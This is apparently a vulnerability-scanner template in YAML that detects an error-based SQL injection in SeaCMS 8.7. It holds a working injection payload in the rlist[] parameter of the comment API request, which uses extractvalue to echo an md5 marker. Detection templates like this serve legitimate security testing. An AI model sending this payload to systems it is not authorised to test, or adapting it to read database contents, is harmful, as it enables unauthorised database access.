http:
- host-redirects: true
  matchers:
  - part: body
    type: word
    words:
    - '{{md5({{num}})}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`'
id: seacms-sqli
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  description: SeaCMS 8.7 contains a SQL injection vulnerability. An attacker can
    possibly obtain sensitive information from a database, modify data, and execute
    unauthorized administrative operations in the context of the affected site.
  metadata:
    max-request: 1
  name: SeaCMS 8.7 - SQL Injection
  reference:
  - https://www.uedbox.com/post/54561/
  severity: critical
  tags: seacms,sqli
variables:
  num: '999999999'
